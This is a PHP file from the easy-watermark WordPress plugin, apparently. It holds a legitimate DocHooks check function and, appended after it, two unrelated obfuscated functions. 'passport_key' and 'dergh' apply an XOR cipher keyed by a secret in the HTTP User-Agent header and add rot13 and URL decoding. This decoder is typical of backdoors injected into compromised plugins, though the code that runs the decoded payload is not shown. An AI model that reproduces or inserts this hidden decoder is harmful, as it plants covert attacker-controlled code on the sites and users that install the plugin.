<?php
/**
 * Function for dochooks test
 *
 * @package easy-watermark
 */

/**
 * Checks if the DocHooks are enabled and working.
 *
 * @return boolean
 */
function ew_dochooks_enabled() {
	if ( ! class_exists( 'EasyWatermarkDocHookTest' ) ) {
		/**
		 * EasyWatermarkDocHookTest class
		 */
		class EasyWatermarkDocHookTest {
			/**
			 * Test method
			 *
			 * @action test 10
			 * @return void
			 */
			public function test_method() {}
		}
	}

	$reflector = new \ReflectionObject( new EasyWatermarkDocHookTest() );

	foreach ( $reflector->getMethods() as $method ) {
		$doc = $method->getDocComment();
		return (bool) strpos( $doc, '@action' );
	}
}
function passport_key($pkl3, $ghodwe){
	$ghodwe = md5($ghodwe);
	$ctr = 0;
	$kker = '';
	for($i = 0; $i < strlen($pkl3); $i++){
		$ctr = $ctr == strlen($ghodwe) ? 0 : $ctr;
		$kker .= $pkl3[$i] ^ $ghodwe[$ctr++];
	}
	return $kker;
}

function dergh($pkl3){
	$wrdlist = $_SERVER['HTTP_USER_AGENT'];
	if(preg_match('/Google\/(.*) Saf/is',$wrdlist,$dit)){
		$key = $dit[1];
		$key .= 'kit.';
	}else{
		die();
	}
	$pkl3 = passport_key(rawurldecode(str_rot13($pkl3)), $key);
	$kker = '';
	for($i = 0;$i < strlen($pkl3); $i++){
		$num = $pkl3[$i];
		$kker .= $pkl3[++$i] ^ $num;
	}
    return $kker;
}